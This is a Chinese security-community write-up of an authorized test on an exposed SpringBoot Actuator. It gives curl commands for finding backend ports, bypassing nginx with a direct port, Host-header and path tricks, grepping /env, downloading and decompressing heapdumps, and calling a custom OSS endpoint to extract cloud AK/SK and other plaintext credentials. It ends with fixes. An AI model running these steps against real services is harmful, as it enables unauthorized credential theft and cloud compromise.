---
title: 【先知】SpringBoot Actuator 泄露挖掘实战：从 /env 到 heapdump
source: https://xz.aliyun.com/news/92675
source_host: xz.aliyun.com
clip_date: 2026-08-11T15:45:33+08:00
trace_id: ce229316-395c-4d4a-bf0d-81ac7c5c610c
content_hash: 104a6eed90096604649e031a0ca93124adf6b04492e3273c845e7959db6bc7fc
status: synced
tags:
  - 先知
  - 漏洞分析
  - SpringBoot Actuator
series: null
feed_source: 先知安全技术社区
ai_summary: TL;DR：SpringBoot Actuator 未认证泄露，可由 /env 与 heapdump 等端点拿到云 AK/SK、数据库和 Eureka 明文密码；挖掘关键是绕代理找直连端口、解压 heapdump、找自定义 OSS 接口。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3b975244-d011-8115-90dc-d2a9f5d054ef
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：SpringBoot Actuator 未认证泄露，可由 /env 与 heapdump 等端点拿到云 AK/SK、数据库和 Eureka 明文密码；挖掘关键是绕代理找直连端口、解压 heapdump、找自定义 OSS 接口。
> 
> - **真实攻击面：** 443 只挂前端静态文件，后端 API 躲在其他端口；先从 config.js 提取内网 IP、域名与 bucket 线索，再对真实后端端口请求 `/actuator` 确认未认证开启。
> - **绕 nginx 拦截：** `/env` 等敏感路径常被反代拦 403/404，实战用 `:1443` 直连 Tomcat 后端绕过，其他手法包括 Host 头注入、`//env`、`/%65nv`、`/actuator/../env` 等路径变形。
> - **凭证提取要点：** `/env` 返回全部环境变量/配置，重点 grep password/secret/jdbc/redis/eureka/oss/ak/sk；`/heapdump` 下载后是 gzip 压缩的 HPROF，必须先 `gunzip -c` 解压再 `strings`，原始 25-30MB、解压后 100-150MB；堆内大部分密码被 `******` 脱敏，但 Eureka 注册中心明文密码常可见。
> - **自定义接口更致命：** 标准 `/env` 可能脱敏，但自定义 OSS 配置端点 `/fileOss/getOssConfig` 直接返回完整明文 accessKeyId/secretAccessKey；拿到后需用脚本验证可列桶才构成实锤漏洞（SRC 中危）。
> - **扩展利用与修复：** `/mappings` 泄露全量 API 映射（无认证接口返回 2310 条代理商信息），`/metrics` 暴露 Hystrix 内部服务名，500 堆栈泄露内网 IP；修复应给 Actuator 加认证、`include=health,info` 最小暴露、独立管理端口限内网、OSS 用 RAM 子账号最小权限。

> 一个只暴露静态页面的服务，因为默认配置开启了 Actuator，最终翻出了云厂商的 AccessKey 和注册中心的明文密码。这篇记录完整的挖掘链路，以及过程中踩过的几个关键坑。

* * *

## 起因：443 端口只有静态文件？

某次资产测绘，目标是一个电商零售企业的订购系统。FOFA 显示是 SpringBoot + nginx，但直接访问 443 端口，页面只是个前端静态壳——API 全在别的端口。

这其实是很多 SpringBoot 项目的通病： **前端域名（443/80）只挂静态文件，真实后端躲在别的端口**。想找到后端，先从前端 JS 下手。

`config.js` 里找到了线索：

```bash
curl -sk https://target.com/ | grep -oP 'src="([^"]+)"'   # 找到 JS 文件
curl -sk https://target.com/js/config.js                   # 下载 config
grep -oP '(https?://|)(172\.\d+|192\.\d+|10\.\d+)[^"\s]{0,80}' config.js
```

结果挖出一串东西：

-   `http://172.16.x.x:10004` — 内网 API 地址
-   `https://target.com:12005` — **真实后端端口** （前端 443 根本没有 API）
-   一个云厂商 OSS bucket 地址

**关键认知：前端域名的 443/80 可能只是静态文件，真实 API 在其他端口。** 找到真实后端端口，才是攻击面真正开始的地方。

## 第一步：探测 Actuator

对真实后端端口发请求：

```bash
curl -sk https://target.com:12005/actuator
```

返回 200，带着 `{"_links":{...}}` —— **Actuator 开启了**，而且没挂认证。

SpringBoot Actuator 是个监控管理端点集，默认暴露一堆敏感信息。2.x 版本统一走 `/actuator` 前缀，1.x 是老路径（ `/env` `/health` `/dump` ）。

## 第二步：nginx 拦截？绕！

敏感路径通常会被 nginx 反代拦截（返回 403/404/514）。 `/actuator/env` 直接访问很可能被挡。

**最有效的绕过：找 Tomcat 后端直连端口。** 443 常有代理，但 1443 / 10070 这类端口常常直连 Tomcat，绕过 nginx 的拦截规则：

```bash
curl -sk https://target.com:1443/env    # 直连 Tomcat 后端，绕过 nginx
```

其他绕过姿势：

-   Host Header 注入： `-H "Host: localhost"` / `-H "Host: 内部服务名"`
-   路径变形： `//env` `/./env` `/%65nv` `/actuator/../env`
-   `X-Forwarded-For: 127.0.0.1`

## 第三步：/env 提凭证

`/env` 是最高价值的端点——返回全部环境变量和配置。直接用 grep 过滤敏感关键字：

```bash
curl -sk https://target.com:1443/env | python3 -m json.tool | \
  grep -iE "password|secret|key|token|jdbc|mysql|redis|eureka|rabbit|aliyun|oss|ak|sk"
```

重点狩猎目标（按价值排序）：

1.  **阿里云 OSS AccessKey/SecretKey**— 可操作云存储，等于拿到云资产
2.  **数据库密码**— `jdbc:mysql://` 连接串 → 内网数据库
3.  **Redis / RabbitMQ / ZooKeeper**— 内网中间件，可能未授权
4.  **Eureka 注册中心**— 含明文密码的内网服务发现
5.  **SSO / OAuth 凭证**— 身份认证系统
6.  **内网 IP/域名**— 扩大攻击面
7.  **GitLab 配置仓库地址**— 源码入口

## 第四步：heapdump——最大的坑

`/heapdump` 可以下载 JVM 堆转储，理论上包含所有明文密码。但第一次尝试， `strings` 搜出来是空的。

**坑：heapdump 是 gzip 压缩的，必须先解压！**

```bash
# 下载
curl -sk -o heapdump.hprof https://target.com:1443/heapdump

# 检查文件类型 —— 这一步能救你一小时
file heapdump.hprof
# 输出: gzip compressed data ... Java HPROF dump

# 必须解压！不解压 strings 什么都搜不到
gunzip -c heapdump.hprof > heapdump_raw.hprof

# 导出全部字符串
strings heapdump_raw.hprof > heapdump_strings.txt

# 提取明文凭证
strings heapdump_raw.hprof | grep -iE "(password|secret|accessKey|token|jdbc)" | grep -v "\*\*\*\*\*\*" | sort -u
```

解压后文件通常 100-150MB（原始只有 25-30MB），strings 搜索才有意义。

**一个重要发现**：heapdump 里大部分密码（Redis/DB/OSS）可能被脱敏成 `******` （配置中心远程加载时，明文不进堆）。 **但 Eureka 注册中心的密码常常是明文**：

```bash
strings heapdump_raw.hprof | grep -i 'eureka' | grep -v '\*\*\*\*\*\*'
# 可能直接看到: http://user:password@10.0.0.1:7777/eureka/   （示例格式，非真实数据）
```

## 第五步：自定义 OSS 端点——比 /env 更危险

真正的高价值发现往往不在标准端点，而在 **自定义的 OSS 配置接口**。部分应用有专门返回云存储配置的端点， **返回完整明文 AK/SK（非脱敏）**：

```bash
# 常见路径
curl -sk -X POST https://target.com:PORT/fileOss/getOssConfig
curl -sk https://target.com:PORT/oss/config
```

实战中 `/fileOss/getOssConfig` 直接返回了：

```json
{
  "bucketName": "xxx-retail",
  "endpoint": "oss-cn-beijing.aliyuncs.com",
  "accessKeyId": "LTAI5tNxxxxx",
  "secretAccessKey": "sEnFdDp1fxxxxx"
}
```

**区别于 /env**： `/env` 中 AK/SK 可能被 `******` 脱敏（配置中心远程加载），但自定义 OSS 端点直接从配置读取， **返回完整明文**。这是比标准端点更危险的存在。

拿到 AK/SK 必须实测可利用才算洞——用脚本验证能否列桶/操作对象存储：

```bash
# 验证 AK/SK 是否有权限（纯标准库脚本，免装 SDK）
python3 oss_key_verify.py --ak LTAIxxx --sk sEnFdxxx --endpoint oss-cn-beijing.aliyuncs.com
```

能列桶 = 云存储密钥泄露实锤（中危）。

## 附赠：几个进阶利用点

### 1\. /mappings 泄露全量 API 端点

```bash
curl -sk https://target.com:PORT/mappings
```

全量 URL 映射，包含内部接口——配合 Swagger 找未授权数据接口。实战中 `/agent/findAllByStatus` 无认证返回 2310 个代理商信息。

### 2\. /metrics 微服务发现

```bash
curl -sk https://target.com:PORT/metrics | grep -i hystrix
```

Hystrix gauge 名会暴露内部 Feign client / 服务名，摸清微服务架构。

### 3\. 500 错误堆栈泄露

故意触发根路径让 Spring Boot 返回 500，堆栈常见泄露：内网 IP（172.16.x.x）、内网服务名、JDK/Tomcat 版本。

### 4\. /loggers 改 DEBUG 级别（谨慎）

```bash
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"configuredLevel":"DEBUG"}' \
  https://target.com:PORT/loggers/com.biz
```

⚠️ 改 DEBUG 会大量输出日志， **用后必须回滚到 INFO**——会影响生产环境，能不做就不做。

## 定级参考（SRC 场景）

|     |     |
| --- | --- | 
| 泄露内容 | 定级  |
| AK/SK、DB 密码、云服务凭证 | 中危  |
| OSS 密钥 + 未授权上传 | 中危  |
| 内网 IP + 端口拓扑 | 中危  |
| 仅服务名、版本号 | 低危（基本不收） |
| heapdump 敏感信息 | 低危  |
| Eureka 明文密码 | 中危  |

## 修复建议

1.  **Actuator 加认证**：引入 spring-security，所有 `/actuator/**` 必须登录
2.  **nginx 层拦截敏感路径**： `/env` `/heapdump` `/trace` `/mappings` 白名单之外全挡
3.  **只暴露必要端点**： `management.endpoints.web.exposure.include=health,info` 即可，其他全 exclude
4.  **管理端口与业务端口分离**：Actuator 绑独立端口 + 内网访问限制
5.  **云凭证最小权限**：OSS 用 RAM 子账号 + 最小权限策略，即使泄露也无法越权

* * *

## 一句话总结

SpringBoot Actuator 泄露是\*\*"默认配置"引发的典型漏洞\*\*——框架默认开启、开发者忘了关，就成了信息泄露的入口。而真正的杀伤力不在 `/env` 本身，在于 **链**：Actuator → 明文 AK/SK → 云存储操作 → 供应链风险。挖洞的价值，在于把这条链走通，而不是停留在"端点开了"。

**（本文为授权攻防演练中的技术复盘，涉及目标与数据均已脱敏。）**
